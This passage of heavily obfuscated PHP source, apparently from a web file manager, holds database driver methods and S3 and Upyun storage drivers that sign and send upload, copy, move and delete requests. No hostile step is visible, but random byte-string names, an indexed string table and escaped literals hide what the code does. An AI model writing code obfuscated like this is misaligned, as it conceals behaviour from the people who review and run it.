(isset($İƒ®´şğ[$µÂëÍÕÕ[67]]) ? $İƒ®´şğ[$µÂëÍÕÕ[67]] : !1), $µÂëÍÕÕ[52] => isset($İƒ®´şğ[$µÂëÍÕÕ[946]]) ? strtolower($İƒ®´şğ[$µÂëÍÕÕ[946]]) == $µÂëÍÕÕ[54] : (isset($İƒ®´şğ[$µÂëÍÕÕ[105]]) ? $İƒ®´şğ[$µÂëÍÕÕ[105]] : !1)); } } return $ÀÃá›§; } public function getTables($ƒüŸŠÂü = '') { $…õºÚÊ× =& $_SERVER[Å¶¨Şêº]; if (think_config($…õºÚÊ×[947])) { $æƒç³È = str_replace($…õºÚÊ×[948], $ƒüŸŠÂü, think_config($…õºÚÊ×[947])); } else { switch ($this->dbType) { case $…õºÚÊ×[915]: case $…õºÚÊ×[917]: $æƒç³È = $…õºÚÊ×[949]; break; case $…õºÚÊ×[914]: case $…õºÚÊ×[932]: $æƒç³È = $…õºÚÊ×[950]; break; case $…õºÚÊ×[941]: $æƒç³È = $…õºÚÊ×[951]; break; case $…õºÚÊ×[916]: think_exception(think_lang($…õºÚÊ×[952]) . $…õºÚÊ×[953]); break; case $…õºÚÊ×[933]: $æƒç³È = $…õºÚÊ×[55] . $…õºÚÊ×[56] . $…õºÚÊ×[57]; break; case $…õºÚÊ×[944]: default: if (!empty($ƒüŸŠÂü)) { $æƒç³È = $…õºÚÊ×[896] . $ƒüŸŠÂü . $…õºÚÊ×[897]; } else { $æƒç³È = $…õºÚÊ×[898]; } } } $¿¤ëıƒ† = $this->query($æƒç³È); $ÆÜéŠîá = array(); foreach ($¿¤ëıƒ† as $ŒıÑ¨Íç => $³À¤”¯‹) { $ÆÜéŠîá[$ŒıÑ¨Íç] = current($³À¤”¯‹); } return $ÆÜéŠîá; } protected function parseLimit($Ô¡æîìÚ) { $¡üšÍ©Œ =& $_SERVER[Å¶¨Şêº]; $Ü¸¦›Î¤ = $¡üšÍ©Œ[12]; if (!empty($Ô¡æîìÚ)) { switch ($this->dbType) { case $¡üšÍ©Œ[941]: case $¡üšÍ©Œ[933]: $Ô¡æîìÚ = explode($¡üšÍ©Œ[60], $Ô¡æîìÚ); if (count($Ô¡æîìÚ) > 1) { $Ü¸¦›Î¤ .= $¡üšÍ©Œ[61] . $Ô¡æîìÚ[1] . $¡üšÍ©Œ[62] . $Ô¡æîìÚ[0] . $¡üšÍ©Œ[63]; } else { $Ü¸¦›Î¤ .= $¡üšÍ©Œ[61] . $Ô¡æîìÚ[0] . $¡üšÍ©Œ[63]; } break; case $¡üšÍ©Œ[914]: case $¡üšÍ©Œ[932]: break; case $¡üšÍ©Œ[916]: break; case $¡üšÍ©Œ[915]: case $¡üšÍ©Œ[917]: break; case $¡üšÍ©Œ[944]: default: $Ü¸¦›Î¤ .= $¡üšÍ©Œ[61] . $Ô¡æîìÚ . $¡üšÍ©Œ[63]; } } return $Ü¸¦›Î¤; } public function parseKey(&$Óë‡÷™õ, $·Œ­“¾ = true) { $‰óÃ£˜¹ =& $_SERVER[Å¶¨Şêº]; if ($·Œ­“¾) { $Óë‡÷™õ = $this->parseKeyCheck($Óë‡÷™õ); } if ($this->dbType == $‰óÃ£˜¹[944]) { if ($Óë‡÷™õ != $‰óÃ£˜¹[200] && !preg_match($‰óÃ£˜¹[908], $Óë‡÷™õ)) { $Óë‡÷™õ = $‰óÃ£˜¹[394] . trim($Óë‡÷™õ, $‰óÃ£˜¹[394]) . $‰óÃ£˜¹[394]; } return $Óë‡÷™õ; } else { return parent::parseKey($Óë‡÷™õ, $·Œ­“¾); } } public function close() { $this->_linkID = null; } public function error() { $ÄåàÅ´ =& $_SERVER[Å¶¨Şêº]; if ($this->PDOStatement) { $×Ïß¾İ = $this->PDOStatement->errorInfo(); $this->error = $×Ïß¾İ[1] . $ÄåàÅ´[4] . $×Ïß¾İ[2]; } else { $this->error = $ÄåàÅ´[12]; } if ($ÄåàÅ´[12] != $this->queryStr) { $this->error .= LNG($ÄåàÅ´[58]) . $this->queryStr; } think_trace($this->error, $ÄåàÅ´[12], $ÄåàÅ´[59]); return $this->error; } public function escapeString($üÆÙé¦é) { $ş„ê†¶ç =& $_SERVER[Å¶¨Şêº]; switch ($this->dbType) { case $ş„ê†¶ç[941]: case $ş„ê†¶ç[914]: case $ş„ê†¶ç[932]: case $ş„ê†¶ç[944]: return addslashes($üÆÙé¦é); case $ş„ê†¶ç[916]: case $ş„ê†¶ç[933]: case $ş„ê†¶ç[915]: case $ş„ê†¶ç[917]: return str_ireplace($ş„ê†¶ç[68], $ş„ê†¶ç[69], $üÆÙé¦é); } } protected function parseValue($ó«•Öö°) { $äûÙ‘â¯ =& $_SERVER[Å¶¨Şêº]; if (is_string($ó«•Öö°)) { $¼×Ôóú¦ = strpos($ó«•Öö°, $äûÙ‘â¯[4]) === 0 && in_array($ó«•Öö°, array_keys($this->bind)); $ó«•Öö° = $¼×Ôóú¦ ? $this->escapeString($ó«•Öö°) : $äûÙ‘â¯[954] . $this->escapeString($ó«•Öö°) . $äûÙ‘â¯[954]; } elseif (isset($ó«•Öö°[0]) && is_string($ó«•Öö°[0]) && strtolower($ó«•Öö°[0]) == $äûÙ‘â¯[307]) { $ó«•Öö° = $this->escapeString($ó«•Öö°[1]); } elseif (is_array($ó«•Öö°)) { $ó«•Öö° = array_map(array($this, $äûÙ‘â¯[955]), $ó«•Öö°); } elseif (is_bool($ó«•Öö°)) { $ó«•Öö° = $ó«•Öö° ? $äûÙ‘â¯[99] : $äûÙ‘â¯[209]; } elseif (is_null($ó«•Öö°)) { $ó«•Öö° = $äûÙ‘â¯[114]; } return $ó«•Öö°; } public function getLastInsertId() { $ñÚÒ°ÁÎ =& $_SERVER[Å¶¨Şêº]; switch ($this->dbType) { case $ñÚÒ°ÁÎ[941]: case $ñÚÒ°ÁÎ[933]: case $ñÚÒ°ÁÎ[914]: case $ñÚÒ°ÁÎ[932]: case $ñÚÒ°ÁÎ[916]: case $ñÚÒ°ÁÎ[944]: return $this->_linkID->lastInsertId(); case $ñÚÒ°ÁÎ[915]: case $ñÚÒ°ÁÎ[917]: $èØ¸Ï³¾ = $this->table; $ı›œäü = $this->query("\x53\x45\114\105\x43\x54\40{$èØ¸Ï³¾}\x2e\x63\165\x72\162\x76\141\x6c\40\143\x75\x72\x72\166\141\x6c\40\106\122\x4f\x4d\40\144\165\x61\x6c"); return $ı›œäü ? $ı›œäü[0][$ñÚÒ°ÁÎ[956]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($£¼ÃèíÉ) { $ˆç™ôëá =& $_SERVER[Å¶¨Şêº]; if (!CacheLock::fileLock($ˆç™ôëá[23])) { return !1; } $ìõæğ÷… = parent::query($£¼ÃèíÉ); CacheLock::fileUnLock($ˆç™ôëá[23]); return $ìõæğ÷…; } public function execute($ø™¯¤¶³) { $ÙŞ¼´Ä÷ =& $_SERVER[Å¶¨Şêº]; if (!CacheLock::fileLock($ÙŞ¼´Ä÷[23])) { return !1; } $µË¾´º° = parent::execute($ø™¯¤¶³); CacheLock::fileUnLock($ÙŞ¼´Ä÷[23]); return $µË¾´º°; } } goto C×‡µÓÁëä; eŞ¶­çÛ¸„: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($è¯Èî¹Å) { parent::__construct($è¯Èî¹Å); } public function uploadFormData($ı¤òúãÁ, $Û±ç’£Ù = 3600) { $„şïóµÖ =& $_SERVER[Å¶¨Şêº]; $àØ— Â¥ = $„şïóµÖ[210]; $ƒ­­‰‘Š = $„şïóµÖ[1356]; $ÉšÅ‰‚« = $„şïóµÖ[73]; $×ê¬ÕÕ = gmdate($„şïóµÖ[1357]); $€ŠÓ¬²ì = gmdate($„şïóµÖ[748]); $ß‘Äç¦á = $„şïóµÖ[1358]; $§ñœ²Å = $Û±ç’£Ù . $„şïóµÖ[12]; $·¶æğ“¤ = $„şïóµÖ[1320]; $”ŞöÄÖõ = array($this->accessKey, $€ŠÓ¬²ì, $this->region, $ÉšÅ‰‚«, $ß‘Äç¦á); $°Æß¿ÙÉ = implode($„şïóµÖ[8], $”ŞöÄÖõ); $×âŸ“­® = array($„şïóµÖ[1322] => gmdate($„şïóµÖ[1321], strtotime($„şïóµÖ[1359])), $„şïóµÖ[1323] => array(array($„şïóµÖ[1325] => $this->bucket), array($„şïóµÖ[1324] => $àØ— Â¥), array($„şïóµÖ[1326], $„şïóµÖ[1327], $„şïóµÖ[12]), array($„şïóµÖ[1326], $„şïóµÖ[1360], $„şïóµÖ[12]), array($„şïóµÖ[1326], $„şïóµÖ[1361], $„şïóµÖ[12]), array($„şïóµÖ[1328] => $·¶æğ“¤), array($„şïóµÖ[1362] => $°Æß¿ÙÉ), array($„şïóµÖ[1363] => $ƒ­­‰‘Š), array($„şïóµÖ[1364] => $×ê¬ÕÕ), array($„şïóµÖ[1365] => $§ñœ²Å))); $Å§­õşÙ = base64_encode(json_encode($×âŸ“­®)); $¢åÔ¼œñ = hash_hmac($„şïóµÖ[1366], $€ŠÓ¬²ì, $„şïóµÖ[1367] . $this->secret, !0); $Í½£Ã = hash_hmac($„şïóµÖ[1366], $this->region, $¢åÔ¼œñ, !0); $Øë…ÄäÉ = hash_hmac($„şïóµÖ[1366], $ÉšÅ‰‚«, $Í½£Ã, !0); $ëÊ¯ŸŸó = hash_hmac($„şïóµÖ[1366], $ß‘Äç¦á, $Øë…ÄäÉ, !0); $±­é§üâ = hash_hmac($„şïóµÖ[1366], $Å§­õşÙ, $ëÊ¯ŸŸó); $âóºöå = array($„şïóµÖ[226] => $„şïóµÖ[12], $„şïóµÖ[1368] => $„şïóµÖ[12], $„şïóµÖ[1324] => $àØ— Â¥, $„şïóµÖ[1328] => $·¶æğ“¤, $„şïóµÖ[1332] => $Å§­õşÙ, $„şïóµÖ[1369] => $°Æß¿ÙÉ, $„şïóµÖ[1370] => $ƒ­­‰‘Š, $„şïóµÖ[1371] => $×ê¬ÕÕ, $„şïóµÖ[1372] => $§ñœ²Å, $„şïóµÖ[1373] => $±­é§üâ, $„şïóµÖ[193] => $this->getHost()); return $âóºöå; } public function multiUploadFormData($èğå®¤, $¤°Ì³¢Ó = 3600) { $ø¢âè¹‰ =& $_SERVER[Å¶¨Şêº]; $ã½şú­‚ = gmdate($ø¢âè¹‰[1452]); $ş¼¬³¤õ = array(); $ùáåôª» = $this->client->getUploadId($this->bucket, $èğå®¤, $ş¼¬³¤õ); if (!$ùáåôª») { return !1; } return array($ø¢âè¹‰[234] => $ùáåôª», $ø¢âè¹‰[193] => $this->getHost() . $ø¢âè¹‰[8] . $this->pathEncode($èğå®¤), $ø¢âè¹‰[235] => $ã½şú­‚, $ø¢âè¹‰[105] => $èğå®¤); } public function multiUploadAuthData($´«ñèšÊ, $¬š©× = array()) { $µ²¸Ä—… =& $_SERVER[Å¶¨Şêº]; $ç’óÏ€ò = isset($¬š©×[$µ²¸Ä—…[185]]) ? $¬š©×[$µ²¸Ä—…[185]] : $µ²¸Ä—…[12]; $¤„íËÆò = $¬š©×[$µ²¸Ä—…[105]]; unset($¬š©×[$µ²¸Ä—…[105]]); if (isset($¬š©×[$µ²¸Ä—…[236]])) { return $this->listUploadParts($¤„íËÆò, $¬š©×); } $·Œïòİ = array(); if (isset($¬š©×[$µ²¸Ä—…[1453]])) { $·Œïòİ[$µ²¸Ä—…[1454]] = $¬š©×[$µ²¸Ä—…[1453]]; } $×‰Ÿæ˜ = explode($µ²¸Ä—…[195], $this->getHost()); $£âÀíà = array($µ²¸Ä—…[1455] => $×‰Ÿæ˜[1], $µ²¸Ä—…[1456] => $µ²¸Ä—…[12], $µ²¸Ä—…[226] => $µ²¸Ä—…[131], $µ²¸Ä—…[1368] => $¬š©×[$µ²¸Ä—…[87]]); $˜™Ü²æ» = $µ²¸Ä—…[239]; $„Ü®º†« = $µ²¸Ä—…[8] . $this->pathEncode($¤„íËÆò) . $ç’óÏ€ò; $œÊÊŞ = $this->client->__getSignatureV4($·Œïòİ, $£âÀíà, $˜™Ü²æ», $„Ü®º†«); if (strpos($ç’óÏ€ò, $µ²¸Ä—…[238]) === 0) { if (isset($·Œïòİ[$µ²¸Ä—…[1454]])) { $Æø·Éˆ¨ = $·Œïòİ[$µ²¸Ä—…[1454]]; } else { if (isset($œÊÊŞ[$µ²¸Ä—…[1454]])) { $Æø·Éˆ¨ = $œÊÊŞ[$µ²¸Ä—…[1454]]; } else { $Æø·Éˆ¨ = hash($µ²¸Ä—…[1366], $µ²¸Ä—…[12]); } } return array($µ²¸Ä—…[244] => $œÊÊŞ[$µ²¸Ä—…[244]], $µ²¸Ä—…[1454] => $Æø·Éˆ¨, $µ²¸Ä—…[235] => $œÊÊŞ[$µ²¸Ä—…[1457]]); } return $œÊÊŞ[$µ²¸Ä—…[244]]; } public function listUploadParts($³°±­ÑÈ, $§èÆã€• = array()) { $¨íé†°û =& $_SERVER[Å¶¨Şêº]; $’ßÌ¢ß¡ = str_replace($¨íé†°û[245], $¨íé†°û[12], $§èÆã€•[$¨íé†°û[185]]); $ƒõ¦¢œ¸ = $this->client->listParts($this->bucket, $³°±­ÑÈ, $’ßÌ¢ß¡); if (!$ƒõ¦¢œ¸) { return !1; } $ß®–Ğ¿™ = $¨íé†°û[1458]; foreach ($ƒõ¦¢œ¸ as $ß‰ãµ‡Ì) { $ß®–Ğ¿™ .= $¨íé†°û[1459] . "\x3c\x50\x61\162\164\x4e\x75\x6d\142\145\162\76{$ß‰ãµ‡Ì[$¨íé†°û[1413]]}\74\57\x50\x61\x72\164\x4e\165\155\x62\x65\x72\x3e\xa" . "\x3c\x45\124\141\x67\76{$ß‰ãµ‡Ì[$¨íé†°û[1414]]}\74\x2f\105\124\x61\147\76\xa" . $¨íé†°û[1460]; } $ß®–Ğ¿™ .= $¨íé†°û[1461]; $…ãğ¡®© = array(); $®°©Í‡Ä = explode($¨íé†°û[195], $this->getHost()); $¸®¹Ùìé = array($¨íé†°û[1455] => $®°©Í‡Ä[1], $¨íé†°û[226] => $¨íé†°û[131], $¨íé†°û[1368] => strlen($ß®–Ğ¿™)); $Èƒ“ğÔª = $¨íé†°û[237]; $„úÁ³ï  = $¨íé†°û[8] . $this->pathEncode($³°±­ÑÈ) . $§èÆã€•[$¨íé†°û[185]]; $šÍ§ï¼ = $this->client->__getSignatureV4($…ãğ¡®©, $¸®¹Ùìé, $Èƒ“ğÔª, $„úÁ³ï , $ß®–Ğ¿™); return array($¨íé†°û[244] => $šÍ§ï¼[$¨íé†°û[244]], $¨íé†°û[235] => $šÍ§ï¼[$¨íé†°û[1457]], $¨íé†°û[246] => $ƒõ¦¢œ¸, $¨íé†°û[1454] => $šÍ§ï¼[$¨íé†°û[1454]]); } public function link($Ãş¤éÜ´, $š¯úöÇå = array()) { return parent::link($Ãş¤éÜ´, $š¯úöÇå); } public function fileOut($œüÂîÄ¨, $Ë¿€üÏª = false, $øŠÃñ’  = false, $ÎĞÙªĞÁ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Å¶¨Şêº][1462])) { return parent::fileOutServer($œüÂîÄ¨, $Ë¿€üÏª, $øŠÃñ’ , $ÎĞÙªĞÁ); } parent::fileOut($œüÂîÄ¨, $Ë¿€üÏª, $øŠÃñ’ , $ÎĞÙªĞÁ); } public function fileOutImage($âßˆ–Ù, $´ã¡˜¨ = 250) { if (strstr($this->endpoint, $_SERVER[Å¶¨Şêº][1462])) { return parent::fileOutImageServer($âßˆ–Ù, $´ã¡˜¨); } parent::fileOutImage($âßˆ–Ù, $´ã¡˜¨); } public function fileOutLink($ ¬…¬Åø) { $”›ô õ± =& $_SERVER[Å¶¨Şêº]; if (substr($ ¬…¬Åø, 0, 7) == $”›ô õ±[1335]) { $ ¬…¬Åø = $”›ô õ±[1336] . substr($ ¬…¬Åø, 7); } header($”›ô õ±[172] . $ ¬…¬Åø); die; } public function getHost() { $²æÒ” =& $_SERVER[Å¶¨Şêº]; $“™ÇÌéì = str_rtrim(parent::getHost(), $²æÒ”[8] . $this->bucket); $“™ÇÌéì = explode($²æÒ”[195], $“™ÇÌéì); return $“™ÇÌéì[0] . $²æÒ”[195] . $this->bucket . $²æÒ”[10] . $“™ÇÌéì[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¾ãˆÈ¢°, $™°£¿ëß = 0) { parent::__construct(); $this->source = $¾ãˆÈ¢°; $this->sourceSize = $™°£¿ëß; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‘å¶­†½ = false) { return $this->sourceSize; } public function getContent($²üŞà = false) { return $this->fileSubstr($²üŞà, 0, $this->sourceSize); } public function fileSubstr($ÁÈˆ„˜ = false, $¹µòŞ³Ã = 0, $÷¾òö¬‡ = 0) { if (!$÷¾òö¬‡) { $÷¾òö¬‡ = $this->sourceSize; } $¼ÖâïØ = $this->sourceSize - $¹µòŞ³Ã; if ($÷¾òö¬‡ >= $¼ÖâïØ) { $÷¾òö¬‡ = $¼ÖâïØ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¹µòŞ³Ã, $÷¾òö¬‡); } if ($this->sourceType == self::TYPE_FILE) { if ($÷¾òö¬‡ <= 0) { return $_SERVER[Å¶¨Şêº][12]; } $Û‹¶Ãï× = ftell($this->source); fseek_64($this->source, $Û‹¶Ãï× + $¹µòŞ³Ã); $Ìó”°üª = @fread($this->source, $÷¾òö¬‡); fseek_64($this->source, $Û‹¶Ãï×); return $Ìó”°üª; } } public function hashMd5($Å»¼Å¬¿ = false) { return md5($this->getContent()); } public static function hash($Àú«ÍŞ½, $…÷¸±‡Ê = 0) { $õİ…†æ¶ = new PathDriverStream($Àú«ÍŞ½, $…÷¸±‡Ê); return $õİ…†æ¶->hashSimple($Àú«ÍŞ½); } public static function md5($áœïÙ, $ƒÀ—Œ = 0) { $‚Ÿğ‹—û = new PathDriverStream($áœïÙ, $ƒÀ—Œ); return $‚Ÿğ‹—û->hashMd5($áœïÙ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\57\57\166\60\56\141\160\151\x2e\x75\x70\x79\x75\x6e\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Âº¦ ²â) { parent::__construct(); $this->_init($Âº¦ ²â); } public function _init($ê—Ïé³) { $šµÙ¹ =& $_SERVER[Å¶¨Şêº]; foreach ($ê—Ïé³ as $§ñïÂûø => $æä¿ÃÕ–) { if (isset($this->{$§ñïÂûø})) { $this->{$§ñïÂûø} = $æä¿ÃÕ–; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($šµÙ¹[1463] . LNG($šµÙ¹[1394])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($³¨ £àÊ, $ËİÖ¨¨ = "\x47\x45\124") { $ÉÈçÂ¼ =& $_SERVER[Å¶¨Şêº]; $è¼®áı× = gmdate($ÉÈçÂ¼[1427]); $ÈØÒ‡óø = base64_encode(hash_hmac($ÉÈçÂ¼[1464], "{$ËİÖ¨¨}\46{$³¨ £àÊ}\x26{$è¼®áı×}", md5("{$this->userpass}"), !0)); $õ§¯ëÍ = array("\101\x75\164\150\157\x72\x69\x7a\141\164\x69\x6f\x6e\72\x55\x50\x59\125\x4e\x20{$this->username}\x3a{$ÈØÒ‡óø}", "\x44\141\x74\x65\72{$è¼®áı×}"); return $õ§¯ëÍ; } public function ussRequest($ĞØŒ©ò², $Ê‘ˆÄü¸ = "\107\105\x54", $äª¡ë“Ë = false, $®–€ÎÙ‰ = false, $À¨É„õ = false) { $†ÂÕåğ =& $_SERVER[Å¶¨Şêº]; $ĞØŒ©ò² = trim($ĞØŒ©ò², $†ÂÕåğ[8]); $˜“œë¼ = "\57{$this->bucket}\x2f{$ĞØŒ©ò²}"; $Óæ¦±õ = $this->ussHeaders($˜“œë¼, $Ê‘ˆÄü¸); if ($®–€ÎÙ‰) { $Óæ¦±õ = array_merge($Óæ¦±õ, $®–€ÎÙ‰); } $ô•†¹Î = url_request($this->endpoint . $˜“œë¼, $Ê‘ˆÄü¸, $äª¡ë“Ë, $Óæ¦±õ, $À¨É„õ); if (!$ô•†¹Î) { return array($†ÂÕåğ[1210] => !1, $†ÂÕåğ[1200] => $†ÂÕåğ[1465]); } if (strtolower($Ê‘ˆÄü¸) == $†ÂÕåğ[208] || in_array($ô•†¹Î[$†ÂÕåğ[1210]], array($†ÂÕåğ[1320], $†ÂÕåğ[1466]))) { $äª¡ë“Ë = $ô•†¹Î[$†ÂÕåğ[1467]]; } else { $äª¡ë“Ë = json_decode($ô•†¹Î[$†ÂÕåğ[1200]], !0); if (!$äª¡ë“Ë) { $äª¡ë“Ë = $ô•†¹Î[$†ÂÕåğ[1200]]; } else { if (!$ô•†¹Î[$†ÂÕåğ[747]] && isset($äª¡ë“Ë[$†ÂÕåğ[1468]])) { $äª¡ë“Ë = $äª¡ë“Ë[$†ÂÕåğ[1468]]; } } } return array($†ÂÕåğ[1210] => $ô•†¹Î[$†ÂÕåğ[747]], $†ÂÕåğ[1200] => $äª¡ë“Ë); } public function mkfile($õ³ŸÑ‚ø, $‚ÖÇÅà = '', $ó¤úõ¯œ = REPEAT_RENAME) { if ($this->setContent($õ³ŸÑ‚ø, $‚ÖÇÅà)) { return $this->getPathOuter($õ³ŸÑ‚ø); } return !1; } public function mkdir($ÉœˆÉ¯Õ, $È½ŞåçŒ = REPEAT_SKIP) { $éòƒõ¢‰ =& $_SERVER[Å¶¨Şêº]; $ÉÇŠÈå = trim($ÉœˆÉ¯Õ, $éòƒõ¢‰[8]); if ($this->_isFolder($ÉÇŠÈå)) { return $this->getPathOuter($ÉÇŠÈå); } $—ÖÍ«´Å = array($éòƒõ¢‰[1469]); $¢óó“•© = $this->ussRequest($ÉÇŠÈå, $éòƒõ¢‰[237], !1, $—ÖÍ«´Å); return $¢óó“•©[$éòƒõ¢‰[1210]] ? $this->getPathOuter($ÉÇŠÈå) : !1; } public function copyFile($›µí¿à÷, $·ŞÔÉÔâ) { $ØÒÄõ° =& $_SERVER[Å¶¨Şêº]; $ ÷¼‹éà = array($ØÒÄõ°[1470] . "\57{$this->bucket}\57{$›µí¿à÷}", $ØÒÄõ°[1471]); $Äİ»ğá× = $this->ussRequest($·ŞÔÉÔâ, $ØÒÄõ°[239], !1, $ ÷¼‹éà); return $Äİ»ğá×[$ØÒÄõ°[1210]] ? !0 : $this->getPathOuter($·ŞÔÉÔâ); } public function moveFile($çÄÕÓ×¬, $”¡ìÃá´) { $ú©öÇ–¤ =& $_SERVER[Å¶¨Şêº]; $¬øô… = array($ú©öÇ–¤[1472] . "\x2f{$this->bucket}\x2f{$çÄÕÓ×¬}", $ú©öÇ–¤[1471]); $úøìıõ‚ = $this->ussRequest($”¡ìÃá´, $ú©öÇ–¤[239], !1, $¬øô…); return $úøìıõ‚[$ú©öÇ–¤[1210]] ? !0 : $this->getPathOuter($”¡ìÃá´); } public function delFile($¼„ù²ù×) { $‚¯ï°À =& $_SERVER[Å¶¨Şêº]; $î°£‰ñĞ = $this->ussRequest($¼„ù²ù×, $‚¯ï°À[1473]); return $î°£‰ñĞ[$‚¯ï°À[1210]] ? !0 : !1; } public function delFolder($µ”İ”Å¬) { $¿Ì§¹«’ =& $_SERVER[Å¶¨Şêº]; if (!$this->exist($µ”İ”Å¬)) { return !0; } $this->listItemCache = !1; $¹ØõÓ® = $¢Ö¸Š± = array(); $this->fileList($µ”İ”Å¬, $¹ØõÓ®, $¢Ö¸Š±, !0); $this->listItemCache = !0; foreach ($¢Ö¸Š± as $¢‹À‰á“) { $§Ë®†Ø = $this->ussRequest($¢‹À‰á“[$¿Ì§¹«’[42]], $¿Ì§¹«’[1473]); if (!$§Ë®†Ø[$¿Ì§¹«’[1210]]) { return !1; } } foreach ($¹ØõÓ® as $ğÈÁÉè¿) { $§Ë®†Ø = $this->ussRequest($ğÈÁÉè¿, $¿Ì§¹«’[1473]); if (!$§Ë®†Ø[$¿Ì§¹«’[1210]]) { return !1; } } $§Ë®†Ø = $this->ussRequest($µ”İ”Å¬, $¿Ì§¹«’[1473]); return $§Ë®†Ø[$¿Ì§¹«’[1210]]; } public function rename($§ÅüÃ¯—, $‹•Éö¶—) { if ($this->isFile($§ÅüÃ¯—)) { $‹•Éö¶— = get_path_father($§ÅüÃ¯—) . $‹•Éö¶—; return $this->moveFile($§ÅüÃ¯—, $‹•Éö¶—); } return $this->renameObject($§ÅüÃ¯—, $‹•Éö¶—); } public function fileInfo($ıºËëè», $ëáàöà÷ = false, $É’ı ¸İ = array()) { $¬ö÷£ˆ™ =& $_SERVER[Å¶¨Şêº]; $ú…—à£ï = array($¬ö÷£ˆ™[42] => $this->pathThis($ıºËëè»), $¬ö÷£ˆ™[95] => $this->getPathOuter($¬ö÷£ˆ™[8] . $ıºËëè»), $¬ö÷£ˆ™[43] => $¬ö÷£ˆ™[211], $¬ö÷£ˆ™[87] => isset($É’ı ¸İ[$¬ö÷£ˆ™[87]]) ? $É’ı ¸İ[$¬ö÷£ˆ™[87]] : 0, $¬ö÷£ˆ™[185] => $this->ext($ıºËëè»)); if ($ëáàöà÷) { return $ú…—à£ï; } $ú…—à£ï[$¬ö÷£ˆ™[212]] = $ú…—à£ï[$¬ö÷£ˆ™[96]] = 0; $ú…—à£ï[$¬ö÷£ˆ™[213]] = $ú…—à£ï[$¬ö÷£ˆ™[214]] = !0; if (empty($É’ı ¸İ)) { $É’ı ¸İ = $this->objectMeta($ıºËëè»); if (!$É’ı ¸İ) { return $ú…—à£ï; } } $ú…—à£ï[$¬ö÷£ˆ™[212]] = intval($É’ı ¸İ[$¬ö÷£ˆ™[1474]]); $ú…—à£ï[$¬ö÷£ˆ™[96]] = intval($É’ı ¸İ[$¬ö÷£ˆ™[1475]]); $ú…—à£ï[$¬ö÷£ˆ™[87]] = $É’ı ¸İ[$¬ö÷£ˆ™[87]]; return $ú…—à£ï; } public function folderInfo($ú¬ßö‹ı, $ß¬µ˜Áû = false) { $é‰Ú¸¿ô =& $_SERVER[Å¶¨Şêº]; $Õ•»ÖºÆ = array($é‰Ú¸¿ô[42] => $this->pathThis($ú¬ßö‹ı), $é‰Ú¸¿ô[95] => $this->getPathOuter($é‰Ú¸¿ô[8] . $ú¬ßö‹ı), $é‰Ú¸¿ô[43] => $é‰Ú¸¿ô[86]); if ($ß¬µ˜Áû) { return $Õ•»ÖºÆ; } $Õ•»ÖºÆ[$é‰Ú¸¿ô[212]] = $Õ•»ÖºÆ[$é‰Ú¸¿ô[96]] = 0; $Õ•»ÖºÆ[$é‰Ú¸¿ô[213]] = $Õ•»ÖºÆ[$é‰Ú¸¿ô[214]] = !0; if (empty($øèäƒ¹Ä)) { $øèäƒ¹Ä = $this->objectMeta($ú¬ßö‹ı); if (!$øèäƒ¹Ä) { return $Õ•»ÖºÆ; } } $Õ•»ÖºÆ[$é‰Ú¸¿ô[212]] = intval($øèäƒ¹Ä[$é‰Ú¸¿ô[1474]]); $Õ•»ÖºÆ[$é‰Ú¸¿ô[96]] = intval($øèäƒ¹Ä[$é‰Ú¸¿ô[1475]]); return $Õ•»ÖºÆ; } private function listObjs($ƒ­Õ­Õå, $ÁËÚò‰É = 0, $ñ›äÇ²³ = 1000) { $¥Â“ô§Ç =& $_SERVER[Å¶¨Şêº]; $¥ë•Ç×– = array($¥Â“ô§Ç[1476], $¥Â“ô§Ç[1477] . $ñ›äÇ²³); if ($ÁËÚò‰É) { $¥ë•Ç×–[] = $¥Â“ô§Ç[1478] . $ÁËÚò‰É; } $Á±œŸ¬ = $this->ussRequest($ƒ­Õ­Õå, $¥Â“ô§Ç[241], !1, $¥ë•Ç×–); return !$Á±œŸ¬[$¥Â“ô§Ç[1210]] ? !1 : $Á±œŸ¬[$¥Â“ô§Ç[1200]]; } private function fileList($ÌˆŒ÷‚, &$Ö§ŒıƒÇ, &$•ê¼‰, $ÒÁÜ…Àß = false) { $¼€ç¶ì =& $_SERVER[Å¶¨Şêº]; $òÓñÇõë = $¼€ç¶ì[12]; $üÕÍØˆ§ = 1000; $îÛ³ëÈ« = rtrim($ÌˆŒ÷‚, $¼€ç¶ì[8]) . $¼€ç¶ì[8]; while (!0) { check_abort(); $˜¾™‰— = $this->listObjs($ÌˆŒ÷‚, $òÓñÇõë, $üÕÍØˆ§); if (!$˜¾™‰—) { return !1; } $òÓñÇõë = isset($˜¾™‰—[$¼€ç¶ì[1479]]) ? $˜¾™‰—[$¼€ç¶ì[1479]] : $¼€ç¶ì[12]; $Ñšè¢‚ú = isset($˜¾™‰—[$¼€ç¶ì[1480]]) ? $˜¾™‰—[$¼€ç¶ì[1480]] : array(); foreach ($Ñšè¢‚ú as $Ê‘Ñô) { $„¬¤æŸè = $Ê‘Ñô[$¼€ç¶ì[43]] == $¼€ç¶ì[86] ? !0 : !1; $øÁŞìË = ltrim($îÛ³ëÈ« . $Ê‘Ñô[$¼€ç¶ì[42]], $¼€ç¶ì[8]) . ($„¬¤æŸè ? $¼€ç¶ì[8] : $¼€ç¶ì[12]); $Ó×®ş»Ò = array($¼€ç¶ì[42] => $øÁŞìË, $¼€ç¶ì[43] => $„¬¤æŸè ? $¼€ç¶ì[86] : $¼€ç¶ì[211], $¼€ç¶ì[87] => $Ê‘Ñô[$¼€ç¶ì[347]], $¼€ç¶ì[1475] => $Ê‘Ñô[$¼€ç¶ì[1481]]); $this->cacheMethodInfoSet($øÁŞìË, $„¬¤æŸè, $Ó×®ş»Ò); if ($„¬¤æŸè) { 